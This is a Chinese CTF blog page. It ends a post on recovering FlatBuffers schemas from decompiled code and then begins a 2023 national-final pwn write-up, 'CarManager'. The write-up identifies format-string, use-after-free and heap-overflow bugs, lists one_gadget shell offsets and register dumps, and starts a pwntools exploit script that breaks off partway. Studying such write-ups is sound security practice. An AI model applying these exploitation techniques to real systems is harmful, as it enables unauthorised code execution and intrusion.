<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> flatbuffers::String *__cdecl Test::Sample::Monster::name(<span class="keyword">const</span> Test::Sample::Monster *<span class="keyword">const</span> <span class="keyword">this</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> flatbuffers::Table::GetPointer&lt;flatbuffers::String <span class="keyword">const</span>*,<span class="keyword">unsigned</span> <span class="keyword">int</span>&gt;(<span class="keyword">this</span>, <span class="number">4u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序的反序列化会大量使用 <code>flatbuffers::Table::GetXXXX</code> 的函数模板，从这些函数中可以看出一些 Scheme 文件的信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> flatbuffers::String *__cdecl Test::Sample::Monster::name(<span class="keyword">const</span> Test::Sample::Monster *<span class="keyword">const</span> <span class="keyword">this</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> flatbuffers::Table::GetPointer&lt;flatbuffers::String <span class="keyword">const</span>*,<span class="keyword">unsigned</span> <span class="keyword">int</span>&gt;(<span class="keyword">this</span>, <span class="number">4u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>第二个参数的数字可以体现该条目在 Scheme 文件中的位置</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int32_t</span> __cdecl Test::Sample::Weapon::value(<span class="keyword">const</span> Test::Sample::Weapon *<span class="keyword">const</span> <span class="keyword">this</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> flatbuffers::Table::GetField&lt;<span class="keyword">int</span>&gt;(<span class="keyword">this</span>, <span class="number">6u</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>从传参个数可以判断该条目是否为标量类型（有3个参数即是标量类型，第3个参数为其默认值）</li>
</ul>
<p>在逆向分析 flatbuffers 的过程中，Verifier 可以暴露大量信息（Verifier 是 flatbuffers 的检查器），它的内部结构如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !flatbuffers::Verifier::<span class="built_in">Check</span>(<span class="keyword">this</span>, <span class="keyword">this</span>-&gt;size_ &gt; <span class="number">0xB</span>) )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> ( identifier )</span><br><span class="line">&#123;</span><br><span class="line">  v4 = <span class="keyword">this</span>-&gt;size_ &gt; <span class="number">7</span> &amp;&amp; flatbuffers::<span class="built_in">BufferHasIdentifier</span>(&amp;<span class="keyword">this</span>-&gt;buf_[start], identifier, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !flatbuffers::Verifier::<span class="built_in">Check</span>(<span class="keyword">this</span>, v4) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">o = flatbuffers::Verifier::VerifyOffset&lt;<span class="keyword">unsigned</span> <span class="keyword">int</span>,<span class="keyword">int</span>&gt;(<span class="keyword">this</span>, start);</span><br><span class="line"><span class="keyword">return</span> flatbuffers::Verifier::<span class="built_in">Check</span>(<span class="keyword">this</span>, o != <span class="number">0</span>)</span><br><span class="line">    &amp;&amp; Test::Sample::Monster::<span class="built_in">Verify</span>((<span class="keyword">const</span> Test::Sample::Monster *<span class="keyword">const</span>)&amp;<span class="keyword">this</span>-&gt;buf_[start + o], <span class="keyword">this</span>);</span><br></pre></td></tr></table></figure>
<p>最后一个函数 Verify 可以泄露有关 Scheme 的信息：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( flatbuffers::Table::<span class="built_in">VerifyTableStart</span>(<span class="keyword">this</span>, verifier)</span><br><span class="line">  &amp;&amp; flatbuffers::Table::VerifyOffset&lt;<span class="keyword">unsigned</span> <span class="keyword">int</span>&gt;(<span class="keyword">this</span>, verifier, <span class="number">4u</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  v2 = Test::Sample::Monster::<span class="built_in">name</span>(<span class="keyword">this</span>);</span><br><span class="line">  <span class="keyword">if</span> ( flatbuffers::Verifier::<span class="built_in">VerifyString</span>(verifier, v2)</span><br><span class="line">    &amp;&amp; flatbuffers::Table::VerifyOffset&lt;<span class="keyword">unsigned</span> <span class="keyword">int</span>&gt;(<span class="keyword">this</span>, verifier, <span class="number">6u</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = Test::Sample::Monster::<span class="built_in">weapon</span>(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">ZNK11flatbuffers8Verifier12VerifyVectorIJENS_6OffsetIN4Test6Sample6WeaponEEEjEEbPKNS_6VectorIT0_T1_EE</span>(</span><br><span class="line">           verifier,</span><br><span class="line">           v3) )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = Test::Sample::Monster::<span class="built_in">weapon</span>(<span class="keyword">this</span>);</span><br><span class="line">      <span class="keyword">if</span> ( flatbuffers::Verifier::VerifyVectorOfTables&lt;Test::Sample::Weapon&gt;(verifier, v4)</span><br><span class="line">        &amp;&amp; flatbuffers::Verifier::<span class="built_in">EndTable</span>(verifier) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>VerifyString 用于分析 string 类型</li>
<li>VectorVerifyVectorOfTables 用于分析 Vector 类型</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> __cdecl Test::Sample::Weapon::<span class="built_in">Verify</span>(<span class="keyword">const</span> Test::Sample::Weapon *<span class="keyword">const</span> <span class="keyword">this</span>, flatbuffers::Verifier *verifier)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">const</span> flatbuffers::String *v2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">bool</span> result; <span class="comment">// al</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( flatbuffers::Table::<span class="built_in">VerifyTableStart</span>(<span class="keyword">this</span>, verifier)</span><br><span class="line">    &amp;&amp; flatbuffers::Table::VerifyOffset&lt;<span class="keyword">unsigned</span> <span class="keyword">int</span>&gt;(<span class="keyword">this</span>, verifier, <span class="number">4u</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = Test::Sample::Weapon::<span class="built_in">key</span>(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">if</span> ( flatbuffers::Verifier::<span class="built_in">VerifyString</span>(verifier, v2)</span><br><span class="line">      &amp;&amp; flatbuffers::Table::VerifyField&lt;<span class="keyword">int</span>&gt;(<span class="keyword">this</span>, verifier, <span class="number">6u</span>, <span class="number">4uLL</span>)</span><br><span class="line">      &amp;&amp; flatbuffers::Verifier::<span class="built_in">EndTable</span>(verifier) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>VerifyField 的第4个参数表示该标量类型条目的大小</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/08/08/%E5%9B%BD%E8%B5%9B-%E5%86%B3%E8%B5%9B2023/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/08/08/%E5%9B%BD%E8%B5%9B-%E5%86%B3%E8%B5%9B2023/" class="post-title-link" itemprop="url">国赛-决赛2023</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-08-08 10:38:09 / Modified: 10:39:57" itemprop="dateCreated datePublished" datetime="2023-08-08T10:38:09+08:00">2023-08-08</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Competition/" itemprop="url" rel="index"><span itemprop="name">Competition</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>30k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>27 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="CarManager"><a href="#CarManager" class="headerlink" title="CarManager"></a>CarManager</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.9</span>)</span> stable release version 2.31.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CarManager: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">5e78</span>faed20a68cb3ad600697b0d036baefa646e8, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，Full RELRO，NX，PIE</li>
</ul>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">write_s</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *introduction_data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( introduction_data )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Car Intro: &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(introduction_data) &lt;= <span class="number">0x3F</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(introduction_data);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      write(<span class="number">1</span>, introduction_data, <span class="number">0x3D</span>uLL);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(&amp;byte_419A);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>UAF 漏洞：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( check() )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span> *)nameg-&gt;car_name-&gt;descript_data);</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span> *)nameg-&gt;car_name-&gt;introduction_data);</span><br><span class="line">  <span class="built_in">free</span>(nameg-&gt;car_name);</span><br><span class="line">  nameg-&gt;car_name = <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>堆溢出漏洞：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( nameg-&gt;descript )</span><br><span class="line">&#123;</span><br><span class="line">  size1 = size;</span><br><span class="line">  <span class="keyword">if</span> ( size1 &gt; <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)nameg-&gt;descript) + <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>((<span class="keyword">void</span> *)nameg-&gt;descript);</span><br><span class="line">    user = nameg;</span><br><span class="line">    user-&gt;descript = (__int64)<span class="built_in">malloc</span>(size);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>这里使用 <code>strlen</code> 获取当前 chunk 的 size，在写满的情况下可能会将 next chunk-&gt;size 也计算在内，导致几字节的堆溢出</li>
<li>PS：遇到这种不记录 size 而是使用 <code>strlen</code> 计算 size 的题目，一定要检查有没有堆溢出</li>
</ul>
<p><strong>入侵思路 - 格式化字符串</strong></p>
<p>使用格式化字符串可以泄露 stack_addr 和 libc_base：</p>
<p>接下来就是通过覆盖返回地址打 one_gadget：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xe3afe</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, r15, r12)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == <span class="literal">NULL</span> || r15 == <span class="literal">NULL</span></span><br><span class="line">  [r12] == <span class="literal">NULL</span> || r12 == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0xe3b01</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, r15, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == <span class="literal">NULL</span> || r15 == <span class="literal">NULL</span></span><br><span class="line">  [rdx] == <span class="literal">NULL</span> || rdx == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0xe3b04</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, rsi, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [rsi] == <span class="literal">NULL</span> || rsi == <span class="literal">NULL</span></span><br><span class="line">  [rdx] == <span class="literal">NULL</span> || rdx == <span class="literal">NULL</span></span><br></pre></td></tr></table></figure>
<p>libc-2.31 的 one_gadget 条件比较高，断点到 ret 并查看此时的寄存器：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*RDX  <span class="number">0xffffffffffffff9c</span></span><br><span class="line"> R12  <span class="number">0x555555555280</span> ◂— endbr64 </span><br><span class="line"> R15  <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>使用一个 <code>pop_rdx_ret</code> 就可以将 RDX 置空，在栈上有预留的 “0”</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp <span class="number">0x7fffffffdc08</span> —▸ <span class="number">0x55555555551a</span> ◂— jmp    <span class="number">0x55555555553f</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x7fffffffdc10</span> ◂— <span class="number">0x82d6d98e46a4e59b</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0x7fffffffdc18</span> ◂— <span class="number">0x100000008</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│ rbp <span class="number">0x7fffffffdc20</span> —▸ <span class="number">0x7fffffffdc30</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0x7fffffffdc28</span> —▸ <span class="number">0x55555555555d</span> ◂— mov    eax, <span class="number">0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│     <span class="number">0x7fffffffdc30</span> ◂— <span class="number">0x0</span> <span class="comment">/* target */</span></span><br></pre></td></tr></table></figure>
<p>搭建 ROP，利用预留的 “0” 置空 RDX，最后写上 one_gadget 就可以了</p>
<p>非完整 exp 如下：（没有写有关逆向的部分）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./CarManager_bug1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;175.22.1.46&#x27;</span>,<span class="string">&#x27;9999&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x191F)\nb *$rebase(0x1E3E)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">control</span>():</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_user</span>(<span class="params">name,password,phone,size,data</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    sla(<span class="string">&quot;username: &quot;</span>,name)</span><br><span class="line">    sla(<span class="string">&quot;password: &quot;</span>,password)</span><br><span class="line">    sla(<span class="string">&quot;phoneNum:&quot;</span>,phone)</span><br><span class="line">    sla(<span class="string">&quot;descript size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;descript data:&quot;</span>,data)</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">name,passwd,phone,size,data</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    sla(<span class="string">&quot;username:&quot;</span>,name)</span><br><span class="line">    sla(<span class="string">&quot;password:&quot;</span>,passwd)</span><br><span class="line">    sla(<span class="string">&quot;phoneNum:&quot;</span>,phone)</span><br><span class="line">    sla(<span class="string">&quot;descript size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;descript data:&quot;</span>,data)</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele_user</span>():</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">6</span>))</span><br><span 